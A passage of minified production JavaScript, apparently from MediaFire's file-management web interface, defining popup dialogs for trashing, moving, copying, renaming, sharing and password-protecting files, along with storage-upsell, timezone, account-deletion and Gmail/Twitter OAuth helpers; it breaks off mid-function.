s=$("<div>Are you sure you want to move "+function(e){uu=e.split(" ");var t=uu[0];uu.shift();var a=uu.join(" ");return yg=t+' <span class="shortenFileName" style="font-weight: 600; color: #000">'+htmlspecialchars(a)+"</span>",yg}(adA(e,r))+" to Trash?</div>").html();o.find("#delete-message").html(s),(a=this).Bz=r,a.quickkeys=e,void 0===i&&(i=!0),i?(n.open(),o.find(".confirm").focus()):o.find(".confirm").click()},popup:n,close:n.close};var a,o,n}function azS(e,t){return o=$(e).popup(),n=o.data("popup"),o.delegate(".confirm","click",(function(e){void 0!==a&&a(!0),n.close(),aeV(e)})),o.delegate(".close","click",(function(e){void 0!==a&&a(!1),n.close(),aeV(e)})),awJ(o,!0,!1),{open:function(e,r){void 0!==r&&(a=r),o.html(t.pop_confirm());var i="<div>"+e+"</div>";o.find("#confirm-message").html(i),n.open(),o.find(".confirm").focus()},popup:n,close:n.close};var a,o,n}function bdt(e,t,a){return o=$(e).popup(),n=o.data("popup"),r="",o.delegate(".confirm","click",(function(e){var t=o.find("#create-file-name").val(),a=Encoder.XSSEncode(t,!0),r=a.split("."),i=r[r.length-1];r.length>1&&r[0].length>0&&i?(LF.SubFile(tH.currentFolder.folderkey,t,null,{onSuccess:function(e){$.publish("file/create",[e,tH.currentFolder])},onError:function(){n.close()}}),n.close(),aeV(e)):(Zi(0,"Please enter a valid filename."),o.find("#create-file-name").val(a).focus())})),awJ(o,!0,!0),{open:function(e){var t={filename:r="Untitled."+e};o.html(a.pop_create_file(t)),n.open(),$(".show_dropdown").removeClass("show_dropdown"),o.find("input").focus();var i=r.split(".")[0].length,s=document.getElementById("create-file-name");s.setSelectionRange&&(s.setSelectionRange(0,i),s.focus())},popup:n,close:n.close};var o,n,r}function awZ(e,t,a){return o="folder"!=t?"file":"folder",n=$(e).popup(),r=n.data("popup"),n.delegate(".confirm","click",(function(e){var t=n.find("input."+o).val(),a={},i=n.find("#details-"+o+"-name").val(),s=n.find("#details-"+o+"-description").val();i.split(".")[0].length>0?(a.description=s,"file"==o?(a.filename=i,LF.aal(a,t)):(a.foldername=i,LF.aal(a,"",t)),r.close(),aeV(e)):(Zi(0,"Name cannot be left blank."),n.find("#details-"+o+"-name").val(i).focus())})),awJ(n,!0,!0),{open:function(e,t){var i;"file"==o?((i=window.tH.files.yx(e)).filename=Encoder.XSSEncode(i.filename,!0),n.html(a.pop_file_details(i))):((i=window.tH.folders.yx(e)).name=Encoder.XSSEncode(i.name,!0),n.html(a.pop_folder_details(i))),$("body").hasClass("myfiles")&&"name"!=t&&n.find(".details-row-name").hide(),$("body").hasClass("myfiles")&&"name"==t&&(n.find(".details-row-desc").hide(),n.find(".Popup-characterCounter").hide(),n.find("legend span").html("Name")),r.open(),t&&n.find(":input[name="+t+"]").focus()},popup:r,close:r.close};var o,n,r}function avk(e,t){return a=$(e).popup(),o=a.data("popup"),a.delegate("button","click",(function(e){var t=a.find("input.file").val(),n=a.find(":input[name=password]").val();n.length>25?window.Zi(0,"Password cannot be longer than 25 characters."):(LF.agD(t,n),o.close(),aeV(e))})),a.delegate("a[name=remove_password]","click",(function(e){var t=a.find("input.file").val();LF.agD(t,""),o.close()})),a.delegate(":input[name=password]","keypress",(function(e){if(8==e.keyCode)return!0;$(this).val().length>=25&&window.Zi(0,"Password cannot be longer than 25 characters.")})),awJ(a,!0,!0),{open:function(e,n,r){n||r?(bcx=!n&&r,a.html(t.pop_password_protect()),a.find("input.file").val(e).end().find(":input[name=password]").val("").end(),bcx&&(a.find(".popup-content").empty(),a.find("button.confirm").hide(),a.find('a[name="remove_password"]').removeClass("gbtnPrimary").addClass("gbtnTertiary")),o.open(),a.find(":input[name=password]").focus()):window.PremiumUpsellLightbox&&window.PremiumUpsellLightbox.showUpsell("pro","password")},popup:o,close:o.close};var a,o}function aOx(e,t){return function(){var a=$(e).popup(),o=a.data("popup");function n(e,t,o,n,r){new window.tH.Cp(a.find("input.file").val());var i={data:{public:t,email_notification:o}};"multiple"==e&&(i.data.emails=n,i.data.message=r)}function r(e){return e.is(":checked")?"yes":"no"}return a.delegate("#single-generate","click",(function(e){return n("single",r($("input#single-privacy")),r($("input#single-notify"))),!1})),a.delegate("#multiple-submit","click",(function(e){var t=r($("input#multiple-privacy")),a=r($("input#multiple-notify")),o=$("input#multiple-emails").val().replace(/\s/g,""),i=$("textarea#multiple-message").val();return""===o?Zi(0,"You need to type at least one email address into the 'Recipients Email' field."):n("multiple",t,a,o,i),!1})),a.delegate("#collaborate-file .tabs li[data-tab]","click",(function(e){var t=$(this).addClass("current").siblings().removeClass("current").end().data("tab"),a=$("#"+t);a.hasClass("tab-expanded")||($("#collaborate-file .tabs > div").hide().removeClass("tab-expanded"),a.slideDown("fast",(function(){a.addClass("tab-expanded")})))})),{open:function(e){a.html(t.pop_collaborate_file()),a.find("input.file").val(e).end(),o.open(),a.find(":input[name=password]").focus(),Clipboard.isSupported()||a.find(".copy-link").hide()},popup:o,close:o.close}}()}function avx(e,t,a){return o="file"!=t?"folder":"file",n=$("#privacy-"+o).length>0?$("#privacy-"+o).popup():$(e).popup(),r=n.data("popup"),"file"==o?n.delegate(".confirm","click",(function(e){var t=n.find("input.status").val(),a=n.find("input.file").val();LF.aah(t,a),r.close(),aeV(e)})):n.delegate("#privacy-folder-single","click",(function(e){var t=n.find("input.status").val(),a=n.find("input.folder").val();LF.aah(t,null,a,!1),r.close(),aeV(e)})).delegate("#privacy-folder-batch","click",(function(e){var t=n.find("input.status").val(),a=n.find("input.folder").val();LF.aah(t,null,a,!0),r.close(),aeV(e)})),awJ(n,!0,!0),{open:function(e,t){var i;"file"==o?(i=window.tH.files.yx(t),n.html(a.pop_file_privacy())):(i=window.tH.folders.yx(t),n.html(a.pop_folder_privacy())),n.find("input."+o).val(t).end().find("input.status").val(e).end().find(".name").text(i.avz()).end().find("b.status").html(e),r.open(),n.find(".confirm").focus()},popup:r,close:r.close};var o,n,r}function aRC(e,t){return a=$(e).popup(),o=a.data("popup"),n=null,a.delegate(".download","click",(function(e){MYF_DirectDownload({files:[a.find("input.quickkey").val()]}),o.close(),aeV(e)})).delegate(".share","click",(function(e){var t=a.find("input.quickkey").val();o.close(),R({files:[t]}),aeV(e)})).delegate(".edit","click",(function(e){n.edit&&3===parseInt(n.edit)?window.open(agW(n,"edit")):n.size>10485760?Zi(0,"Only files smaller than 10 MB can be edited. This file is too large."):window.open(agW(n,"edit")),o.close(),aeV(e)})).delegate(".view, .watch, .listen","click",(function(e){window.open(agW(n)),o.close(),aeV(e)})),awJ(a,!0,!0),{open:function(e){switch(n=window.tH.files.yx(e),a.html(t.pop_file_choices()),a.find("input.quickkey").val(e).end(),!n||avH(n.flag,"1")&&avH(n.parent.flag,"1")||(n.privacy&&"public"!=n.privacy||n.share_link_enabled&&"yes"!=n.share_link_enabled)&&a.find("div.popup-btns button.gbtnPrimary.share").hide(),n.filetype){case"video":case"audio":a.find("div.popup-btns button.gbtnTertiary").hide();break;default:if(a.find("div.popup-btns button.gbtnTertiary:not(.view,.edit)").hide(),aCf(n)||a.find("div.popup-btns button.gbtnTertiary.view").hide(),!aGe(n)||1==SHARED){var r=NZ(n);"2"!=r&&"3"!=r&&a.find("div.popup-btns button.gbtnTertiary.edit").hide()}}o.open(),a.find(".confirm").focus()},popup:o,close:o.close};var a,o,n}function awo(e,t){return a=$(e).popup(),o=a.data("popup"),a.delegate("#update-swap","click",(function(e){var t=a.find(".updatefile_file"),o=t.eq(0),n=t.eq(1);o.insertBefore("#update-availableat"),n.insertBefore("#update-swap"),a.find("#update-url").html(acz()+"/?"+n.data("quickkey")),aeV(e)})).delegate("#update-confirm","click",(function(e){var t=a.find(".updatefile_file"),n=t.eq(0),r=t.eq(1).attr("data-quickkey"),i=n.attr("data-quickkey");LF.agk(r,i),o.close(),aeV(e)})).delegate("#update-cancel","click",(function(e){o.close(),aeV(e)})),awJ(a,!1,!0),{open:function(e){e=e.split(",");var n=tH.files.yx(e[0]),r=tH.files.yx(e[1]),i=n.created.split(" "),s=i[0],l=i[1],d=s.split("-"),c=l.split(":"),f=r.created.split(" "),u=f[0],p=f[1],h=u.split("-"),m=p.split(":");if(new Date(d[0],d[1],d[2],c[0],c[1],c[2],0).valueOf()>new Date(h[0],h[1],h[2],m[0],m[1],m[2],0).valueOf()){var g=n;n=r,r=g}var y={file1:n,file2:r,Xh:10};a.html(t.update_file(y)),a.find("#update-url").html(acz()+"/?"+y.file1.quickkey),o.open()},popup:o,close:o.close};var a,o}function awP(e,t,a){return function(){var a=$(e).popup(),o=a.data("popup");a.html(t.pop_move());var n=new auj({container_selector:"#move-dialog-folderlist",current_folder_class:"current_folder_location",display_linked_folders:!1,onFolderClick:function(e,t){tH.folders.yx(t.folderkey)||tH.folders.Yx(t.folderkey,t)}}),r=!1;return a.delegate(".close","click",(function(e){o.close(),aeV(e)})).delegate("#move-confirm","click",(function(e){var t=a.find("input.files").val(),n=a.find("input.folders").val(),r=a.find(".current_folder_location").closest("li"),i=r.length>0?r.data("info").folderkey:"myfiles";LF.YO(t,n,i),o.close(),$("#folderlist_content").css("overflow-y",""),aeV(e)})).delegate("#move-create","click",(function(e){$("#move-create").hide(),$("#move-create-subfolder-content").show(),$("#move-create-subfolder-name").focus(),$("#move-create-subfolder-confirm").click((function(){var e=a.find(".current_folder_location").data("folderkey");$("#move-create-subfolder-content").hide(),$("#move-create").show(),$("#move-create-subfolder-name").val()&&LF.Wt(e,$("#move-create-subfolder-name").val()),$("#move-create-subfolder-name").val("")})),$("#folderlist_content").css("overflow-y",""),aeV(e)})),awJ(a,!1,!0),{open:function(e,t){if(n.bfx(tH.adq()),!r){var i=-1!==document.getElementById("container").className.indexOf("collabmode");tH.currentFolder&&"myfiles"!=tH.currentFolder.folderkey&&!i?n.acI("myfiles",tH.currentFolder.folderkey,(function(){r=!0})):n.acI("myfiles",null,(function(){r=!0}))}a.find("input.files").val(e).end().find("input.folders").val(t).end(),$("#move-create").show(),$("#move-create-subfolder-content").hide(),$("#move-create-subfolder-name").val(""),o.open(),a.bind("click",(function(e){aeV(e)}))},popup:o,close:o.close}}()}function alT(e,t,a){return function(){var a=$(e).popup(),o=a.data("popup");a.html(t.pop_save());var n=new auj({container_selector:"#save-dialog-folderlist",current_folder_class:"current_folder_location",display_linked_folders:!1,onFolderClick:function(e,t){tH.folders.yx(t.folderkey)||tH.folders.Yx(t.folderkey,t)}}),r=!1;return a.delegate(".close","click",(function(e){o.close(),aeV(e)})).delegate("#save-confirm","click",(function(e){var t=a.find("input.files").val(),n=(a.find("input.folders").val(),a.find(".current_folder_location").closest("li").data("info").folderkey),r=a.find(".current_folder_location").closest("li").data("info").name||"";"myaccount"==n&&(n="myfiles",r="My Files"),r&&(r="'"+r+"'"),t&&window.tH.Cp.auY(t,n,{success:function(e){var a=t.split(","),o=a.length>1?" files have":" file has";"Success"==e.response.result&&(Zi(0,a.length+o+" been saved to your "+r+" folder successfully."),"undefined"!=typeof aHa&&aHa&&aHa.aIX(n))},error:function(e){"162"==JSON.parse(e.responseText).response.error.toString()?aWg(!1,!1,!0):Zi(0,"There was an error trying to save to your account. Please try again later.")}}),o.close(),aeV(e)})),awJ(a,!1,!0),{open:function(e,t){if(t?a.find("input.folders").val(e).end():a.find("input.files").val(e).end(),$("#save-create").show(),$("#save-create-subfolder-content").hide(),$("#save-create-subfolder-name").val(""),n.bfx(tH.adq()),!r){var i=-1!==document.getElementById("container").className.indexOf("collabmode");tH.currentFolder&&"myfiles"!=tH.currentFolder.folderkey&&!i?n.acI("myfiles",tH.currentFolder.folderkey,(function(){r=!0})):n.acI("myfiles",null,(function(){r=!0}))}o.open(),a.bind("click",(function(e){aeV(e)}))},popup:o,close:o.close}}()}function aIt(e,t){return function(){var a=$(e).popup(),o=a.data("popup");a.html(t.pop_save_to_folder());var n=new auj({container_selector:"#destination-dialog-folderlist",current_folder_class:"current_folder_location",display_linked_folders:!1,onFolderClick:function(e,t){tH.folders.yx(t.folderkey)||tH.folders.Yx(t.folderkey,t)}}),r=!1;return a.delegate(".gbtnPrimary","click",(function(e){o.close(),acb&&acb.cancel&&acb.cancel(),aeV(e)})).delegate("#destination-confirm","click",(function(e){o.close();var t=a.find(".current_folder_location").data("info").folderkey;acb&&acb.success&&acb.success(t),aeV(e)})),awJ(a,!1,!0),{open:function(e,t){e&&(acb=e),n.bfx(tH.adq()),r||n.acI("myfiles",t||"myfiles",(function(){r=!0})),o.open(),a.bind("click",(function(e){aeV(e)}))},popup:o,close:o.close,Xb:n}}()}function aFj(e,t,a){return function(){var a=$(e).popup(),o=a.data("popup");a.html(t.pop_copy());var n=new auj({container_selector:"#copy-dialog-folderlist",current_folder_class:"current_folder_location",display_linked_folders:!1,onFolderClick:function(e,t){tH.folders.yx(t.folderkey)||tH.folders.Yx(t.folderkey,t)},onFolderBrowserLoad:function(){var e=n.bbU;e&&!tH.folders.yx(e.folderkey)&&tH.folders.Yx(e.folderkey,e)}}),r=!1;return a.delegate(".close","click",(function(e){o.close(),aeV(e)})).delegate("#copy-confirm","click",(function(e){var t=a.find("input.files").val(),n=a.find("input.folders").val(),r=a.find(".current_folder_location").closest("li"),i=r.length>0?r.data("info").folderkey:"myfiles";LF.aFI(t,n,i),o.close(),$("#folderlist_content").css("overflow-y",""),aeV(e)})).delegate("#copy-create","click",(function(e){$("#copy-create").hide(),$("#copy-create-subfolder-content").show(),$("#copy-create-subfolder-name").focus(),$("#copy-create-subfolder-confirm").click((function(){var e=a.find(".current_folder_location").data("folderkey");$("#copy-create-subfolder-content").hide(),$("#copy-create").show(),$("#copy-create-subfolder-name").val()&&LF.Wt(e,$("#copy-create-subfolder-name").val()),$("#copy-create-subfolder-name").val("")})),$("#folderlist_content").css("overflow-y",""),aeV(e)})),awJ(a,!1,!0),{open:function(e){if(n.bfx(tH.adq()),!r){var t=-1!==document.getElementById("container").className.indexOf("collabmode");tH.currentFolder&&"myfiles"!=tH.currentFolder.folderkey&&!t?n.acI("myfiles",tH.currentFolder.folderkey,(function(){r=!0})):n.acI("myfiles",null,(function(){r=!0}))}a.find("input.files").val(e.files?e.files.join():"").end().find("input.folders").val(e.folders?e.folders.join():"").end(),$("#copy-create").show(),$("#copy-create-subfolder-content").hide(),$("#copy-create-subfolder-name").val(""),o.open(),a.bind("click",(function(e){aeV(e)}))},popup:o,close:o.close,Xb:n}}()}function ayB(e,t){return function(){var a=$(e).popup(),o=a.data("popup");a.html(t.create_account());var n=[],r=[];function i(e){return e?"valid":"invalid"}function s(e,t){$(e).removeClass(i(!t)),$(e).addClass(i(t))}function l(e){$(e).removeClass(i(!1)),$(e).removeClass(i(!0))}return a.delegate("form","submit keyup focus blur",(function(e){if(n&&n.length){var t=0;switch(e.type){case"submit":t=-1;break;default:t=0}return akc=!0,n[0].val().length>t&&(n[0].val().length<=3||!aoF(n[0].val()))?(s(r[0],!1),akc=!1):n[0].val().length>t?s(r[0],!0):l(r[0]),n[0].val().length>t&&(n[1].val().length<=3||!aoF(n[1].val()))?(s(r[1],!1),akc=!1):n[0].val().length>t?s(r[1],!0):l(r[1]),(n[2].val().length<6||n[2].val().length>15)&&n[0].val().length>t?(s(r[2],!1),akc=!1):n[0].val().length>t?s(r[2],!0):l(r[2]),(n[3].val().length<6||n[3].val().length>15)&&n[0].val().length>t?(s(r[3],!1),akc=!1):n[0].val().length>t&&s(r[3],!0),n[0].val()!=n[1].val()&&(s(r[1],!1),akc=!1),n[2].val()!=n[3].val()&&(s(r[3],!1),akc=!1),akc}})),a.delegate(".close","click",(function(e){$('div[id^="MediaFireUploaderSWFDiv"]').show(),o.close(),aeV(e)})),a.delegate(".login_link","click",(function(e){blX("Login"),o.close(),aeV(e)})),a.find(":input[name=reg_emailUL]").bind("keyup",(function(){$(".anon-signup-confirm:eq(0)").show(500)})),a.find(":input[name=reg_passUL]").bind("keyup",(function(){$(".anon-signup-confirm:eq(1)").show(500)})),awJ(a,!0,!0),{open:function(){$('div[id^="MediaFireUploaderSWFDiv"]').hide(),a.find(":input[name=reg_passUL]").val("").end().find(":input[name=reg_passUL2]").val("").end(),o.open();for(var e=0;e<4;e++)n.push(a.find(":input:eq("+e+")")),r.push(".anon-form-section:eq("+e+") div.Form-inputStatusIcon");a.find(":input[name=reg_emailUL]").focus()},popup:o,close:o.close}}()}function axQ(e){return function(t,a){var o=t[e].split(" "),n=o[0],r=o[1],i=n.split("-"),s=r.split(":"),l=a[e].split(" "),d=l[0],c=l[1],f=d.split("-"),u=c.split(":");return new Date(i[0],i[1],i[2],s[0],s[1],s[2],0).valueOf()-new Date(f[0],f[1],f[2],u[0],u[1],u[2],0).valueOf()}}function axw(e){return function(t,a){try{return t[e].toLowerCase().replace(/[^a-zA-Z 0-9]+/g,"")<a[e].toLowerCase().replace(/[^a-zA-Z 0-9]+/g,"")?-1:1}catch(o){return void 0===t&&void 0===a?0:void 0===t?-1:void 0===a?1:void 0===t[e]&&void 0===a[e]?0:void 0===t[e]?-1:void 0===a[e]?1:0}}}function adA(e,t){var a=0;if(e.length&&t.length)return(a=e.length+t.length)+" items";if(e.length){if((a=e.length)>1)return a+" files";var o=window.tH.files.yx(e);return o&&o.filename?"file "+o.filename:"file"}if((a=t.length)>1)return a+" folders";var n=window.tH.folders.yx(t);return n&&n.name?"folder "+n.name:"folder"}function htmlspecialchars(e){return String(e).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#039;")}function bbx(e){if(!e){var t=lc();e="Windows"==t?"win-detected":"Mac"==t?"mac-detected":"linux-detected"}switch(e){case"win-detected":case"mac-detected":window.location="/software/desktop/?agree=yes";break;case"linux-detected":window.location="/software/";break;default:window.location="/software/desktop/?agree=yes&key="+e}return!1}function aDk(e){e||(e=1e4);try{document.body.addEventListener("mousemove",(function(t){0==GLB_bMouseMoved&&(GLB_bMouseMoved=!0),clearTimeout(aEi),aEi=setTimeout((function(){GLB_bMouseMoved=!1}),e)}),!1)}catch(e){}}function avh(){QU()}function aDQ(){QU(),blX("Login")}function bqE(){var e=new Date,t=new Date(e.getFullYear(),0,1),a=new Date(e.getFullYear(),6,1),o=Math.max(a.getTimezoneOffset(),t.getTimezoneOffset());return e.getTimezoneOffset()<o}function aOr(){var e=-(new Date).getTimezoneOffset()/60;return bqE()&&e--,e}function bhT(){var e=aOr(),t=Math.floor(Math.abs(e)),a=e%1*60;return"GMT"+(e>0?"+":"-")+(t<10?"0"+t:t)+":"+(a<10?"0"+a:a)}function aNk(){var e=new Date,t=new Date(e.getFullYear(),0,1),a=new Date(e.getFullYear(),6,1);return t.getTimezoneOffset()!=a.getTimezoneOffset()}function aNb(){var e=new Date,t=new Date(e.getFullYear(),0,1),a=new Date(e.getFullYear(),6,1),o=Math.max(t.getTimezoneOffset(),a.getTimezoneOffset());return e.getTimezoneOffset()<o}function aXa(){var e=$("#avatarStorageNotice");if(e.length>0&&(aXm||aWx)){var t=aXm?"Exceeded":"Approaching";e.show().find("#storageStatus").text(t),e.find("a").unbind("click").click((function(){return aWg(),!1}))}else e.length>0&&e.hide();1==aL("justloggedin")&&e.length>0&&(aXm||aWx)&&aWg(),baO("justloggedin")}function Ni(e,t,a,o,n){if(void 0!==t&&void 0!==a&&void 0!==e){var r="yes"==n,i=parseInt(a,10),s=parseInt(t,10),l=s-i-e;if(l<0||r)return o&&Nu(s,i,Math.abs(l),r),!0}return!1}function Nu(e,t,a,o){LoadIframeLightbox("/templates/upgrade/storage_upsell.php",720,600,!1,!1,!0,!0),$("#modal_msg_iframe").load((function(){var n=$("#modal_msg_iframe").contents();o?n.find(".storageUpsell").removeClass("accountStorageGood unknownExceededLimitActive accountStorageExceeded").addClass("accountStorageExceeded"):n.find(".storageUpsell").removeClass("accountStorageGood unknownExceededLimitActive uploadExceeded").addClass("uploadExceeded"),n.find(".storageOverage").text(fileSizeToString(a)),n.find(".storageUsed").text(fileSizeToString(t)),n.find(".storageLimit, .fullStorage").text(fileSizeToString(e)),n.find(".halfStorage").text(fileSizeToString(e/2)),n.find(".upgradeAmount").text("$"+aXd+" more")}))}function GLB_fUpdateStorageWidget(){(new tH.Dv).aXn({success:function(e){MYF_WIDGET_STORAGE_calculateUsedStoragePercent(e.response.settings.used_storage_size),MYF_WIDGET_STORAGE_updateStorageDisplay()}})}function aXY(e,t){tH&&"undefined"!=typeof MYF_WIDGET_STORAGE_totalStorage?(new tH.Dv).aXn({success:function(a){var o=a.response.settings;if(MYF_WIDGET_STORAGE_calculateUsedStoragePercent(o.used_storage_size),MYF_WIDGET_STORAGE_updateStorageDisplay(),"no"==o.storage_limit_exceeded||!1===aXq){var n=0;if(t)for(var r=0;r<t.length;r++)n+=t[r].size;Ni(n,o.storage_limit,o.used_storage_size,!0,o.storage_limit_exceeded)||e(!1)}else aWg(!0),e(!0)},error:function(){e(!1)}}):e(!1)}function aYX(){var e=$(".dropdownOnClick");e.length&&e.each((function(t,a){$(a).find("a:first").click((function(t){var a=$(this).closest(".dropdownOnClick"),o=a.hasClass("show_dropdown");return e.removeClass("show_dropdown").unbind("clickoutside"),o||a.addClass("show_dropdown").bind("clickoutside",(function(){$(this).removeClass("show_dropdown").unbind("clickoutside")})),!1}))}))}function blX(e){top.location="/login"+("RequireLogin"===e?"?l=1":"")}function GLB_fHeaderLoginHandler(){var e="true"===$("#login_signup").attr("data-redirect");return function(t){blX("Login",e?"myfiles":void 0),t.preventDefault()}}function bhh(e){return e=e.replace(/(\w+@[a-z0-9\-\.]{1,100}\.[a-z]{2,6})/gi,'<a href="mailto:$1">$1</a>').replace(/((https?|ftp)\:\/\/[a-z0-9\-\.]{1,100}\.[a-z]{2,6}([a-z0-9\/\-_~|\.?&=#+@%;,()!]*[a-z0-9\/\-_~|])?)/gi,'<a target="_blank" rel="noreferrer" href="$1">$1</a>')}function Cy(e){if(!0===e){if(top===self)return;top.location.href=self.location.href}else{var t;try{t=/\.mediafire\.com$/.test(top.location.host)}catch(e){t=!1}if(top===self||t)return;top.location.href=self.location.href}setTimeout((function(){Cy(e)}),500)}function NZ(e){return e.permissions?"object"==typeof e.permissions?e.permissions.value?parseInt(e.permissions.value):0:parseInt(e.permissions):0}function agW(e,t){if(e.folderkey)return Encoder.XSSEncode(adv("folder",e.folderkey,bql(e.name)));if(bpz="download"===t,bpH="edit"===t,!e.links&&window.tH&&window.tH.files){var a=window.tH.files.yx(e.quickkey);a&&a.links&&(e.links=a.links)}return e.links||(bqp=bql(e.filename),e.links={normal_download:adv("file",e.quickkey,bqp)},e.viewable&&(e.links.view=adv("view",e.quickkey,bqp))),!bpz&&!bpH&&e.viewable&&e.links.view?Encoder.XSSEncode(e.links.view):bpH&&e.links.edit?Encoder.XSSEncode(e.links.edit):e.links.normal_download?Encoder.XSSEncode(e.links.normal_download):""}function functionCombiner(){this.fArray=[],this.add=function(e){"function"==typeof e&&this.fArray.push(e)},this.execute=function(){var e=arguments;this.fArray.forEach((function(t){t.apply(null,e)}))}.bind(this)}function isSegmentEnabled(){return!!(window.analytics&&window.segmentIdentify&&window.segmentTrack)}function segmentIdentifyFull(){isSegmentEnabled()&&window.segmentIdentify&&segmentIdentify({disk_usage:window.tH.user_info.used_storage_size})}function SegmentIdentifyWithDiskSpace(){isSegmentEnabled()&&(new window.tH.Dv).Yw((function(e){e.response&&e.response.user_info&&(tH.user_info=e.response.user_info,segmentIdentifyFull())}))}function randomString36(e){for(var t="",a="abcdefghijklmnopqrstuvwxyz0123456789",o=0;o<e;o++)t+=a.charAt(Math.floor(Math.random()*a.length));return t}function updateGOExperimentsCookie(e,t){try{var a=JSON.parse(aL("go_exp_list"))}catch(e){a=[]}a.forEach((function(o,n){var r=o.split(":"),i=r[0],s=r[1];r[2]<Math.floor(Date.now()/1e3)&&a.splice(n,1),t==i&&e==s&&a.splice(n,1)}));var o=new Date;o.setDate(o.getDate()+30);var n=t+":"+e+":"+Math.floor(o.getTime()/1e3);a.push(n);var r=new Date;r.setFullYear(r.getFullYear()+1),document.cookie="go_exp_list="+JSON.stringify(a)+";expires="+r.toUTCString()+";domain=mediafire.com;path=/"}function bcP(e){try{if(!$("#userwork").length)throw 1;var t=window.location.protocol+"//"+window.location.hostname+"/dynamic/deleteaccount.php",a=$("<form>",{action:t,method:"post",target:"userwork",id:"UserWorkForm"}),o=$("<input>",{type:"hidden",name:"u",value:e}),n=$("<input>",{type:"hidden",name:"security",value:BIL_sSecurityToken});a.append(o).append(n),$(document.body).append(a),a.submit().remove()}catch(e){alert("Deletion Error\n\nThere was an unknown error while trying to delete your account.\n\nPlease contact support for further assistance.")}}aJ.gmail=function(){var e=location.protocol+"//"+location.host+"/auth/gmail/",t=void 0,a=e+"begin.php",o=e+"contacts.php";window.GmailOauthComplete=function(e){if(clearInterval(l),void 0!==t&&t.close(),e.error)r(e.error);else if(e.fail)i();else{if(e.success)return void(d?s(e.success):function(e){n=!0,$.getJSON(o+"?rk="+e,(function(e){n=!1,e.error?r(e.error):e.fail?i():void 0!==e.success?s(e.success):r("Improper success response found.")})).fail((function(e){n=!1,r(e.statusText)}))}(e.success));r("Improper complete response found.")}};var n=!1,r=void 0,i=void 0,s=void 0,l=void 0,d=!1;function c(){if(void 0===t||null==t.window||t.closed){window.GmailOauthComplete({error:"The window was closed early."})}}return{title:"Gmail",BeginAuth:function(e,o,f,u,p){if(!n){r="function"==typeof o?o:$.noop,i="function"==typeof f?f:$.noop,s="function"==typeof u?u:$.noop,d=1==p;var h=void 0!==window.screenX?window.screenX:window.screenLeft,m=void 0!==window.screenY?window.screenY:window.screenTop,g=void 0!==window.outerWidth?window.outerWidth:document.documentElement.clientWidth,y=void 0!==window.outerHeight?window.outerHeight:document.documentElement.clientHeight-22,v=h<0?window.screen.width+h:h,w=parseInt(v+(g-450)/2,10),b=parseInt(m+(y-450)/2.5,10),_=[];_.push("width=450"),_.push("height=450"),_.push("left="+w),_.push("top="+b),_.push("scrollbars=1"),_.push("location=1,toolbar=0"),_=_.join(","),t=window.open(a,"MFGoogleOauth",_),l=setInterval(c,100),e()}},CancelAuth:function(){void 0!==t&&null!=t.window&&t.close()}}}(),aJ.twitter=function(){var e=location.protocol+"//"+location.host+"/auth/twitter/",t=void 0,a=e+"begin.php",o=e+"contacts.php",n=!1,r=void 0,i=void 0,s=void 0,l=void 0;function d(){if(void 0===t||null==t.window||t.closed){window.TwitterOauthComplete({error:"The window was closed early."})}}return window.TwitterOauthComplete=function(e){if(clearInterval(l),void 0!==t&&t.close(),e.error)r(e.error);else if(e.fail)i();else{if(e.success)return void(n?s(e.success):(e.success,!0,$.getJSON(o,(function(e){!1,e.error?r(e.error):e.fail?i():void 0!==e.success?s(e.success):r("Invalid success response found.")})).fail((function(e){!1,r(e.statusText)}))));r("Improper complete response found.")}},{title:"Twitter",BeginAuth:function(e,o,c,f,u){r="function"==typeof o?o:$.noop,i="function"==typeof c?c:$.noop,s="function"==typeof f?f:$.noop,n=1==u;var p=void 0!==window.screenX?window.screenX:window.screenLeft,h=void 0!==window.screenY?window.screenY:window.screenTop,m=void 0!==window.outerWidth?window.outerWidth:document.documentElement.clientWidth,g=void 0!==window.outerHeight?window.outerHeight:document.documentElement.clientHeight-22,y=p<0?window.screen.width+p:p,v=parseInt(y+(m-680)/2,10),w=parseInt(h+(g-530)/2.5,10),b=[];b.push("width=680"),b.push("height=530"),b.push("left="+v),b.push("top="+w),b.push("scrollbars=1"),b.push("location=1,toolbar=0"),b=b.join(","),t=window.open(a,"MFTwitterOauth",b),l=setInterval(d,100),"function"==typeof e&&e()},CancelAuth:function(){void 0===t||t.closed||t.close()}}}(),$.values=function(e){var t=[];return $.each(e,(function(e,a){t.push(a)})),t},$.fn.reverse=[].reverse,$(aYX),function e(){isSegmentEnabled()&&(window.tH&&tH.user_info&&tH.user_info.used_storage_size?segmentIdentifyFull():setTimeout(e,2e3))}(),window.onmessage=function(e){switch(e.data){case"mf-close-dialogs":QU()}};var JG,ajo,er=1,GM=0,mu=1,eN=1,jS=-1,oM=0,eF=0,eA=-1,gj=0,gv=0,kc=0,gD=0,oD=0,gn=0,bab=0,iZ="",MP=!1,fw=new String(""),Sj=new String(""),gX=0,hZ=0,fq=0,hC=0,eV=1,nk=5,jO=0,jE="",gf=0,kK=null,lk=null,lW="",iR=!1,uE=!1,iJ=-1,jT=0,iP=0,iPreviewScroll=1,RB=0,RA="",SJ=-1,Ua=new Array,agb=0;function dM(e){if(0==iR)return!1;if(null==aProfileFiles)return!1;for(var t=0;aProfileFiles[t];t++)if(aProfileFiles[t]==e)return!0;return!1}function bdh(){document.getElementById("image_thumb_small")&&(document.getElementById("image_thumb_small").className="thumbnail_ns"),document.getElementById("image_thumb_small2")&&(document.getElementById("image_thumb_small2").className="thumbnail_ns"),document.getElementById("image_thumb_big")&&(document.getElementById("image_thumb_big").className="thumbnail_ns"),document.getElementById("image_thumb_big2")&&(document.getElementById("image_thumb_big2").className="thumbnail_ns")}function ej(){if(eL==eU)return parent.aH(0,"You are current NOT in a folder, please enter a folder or create a folder before attempting to share."),!1}function qJ(){var e=null,t=null,a="",o="",n=0,r=document.getElementById("email_files_qks"),i=document.getElementById("email_files_filenames"),s=document.getElementById("email_files_form"),l=document.getElementById("email_files_to");if(l&&""==l.value)aH(0,"You must enter your valid email address in the 'Recipient Email' box..");else if(HX>0){for(var 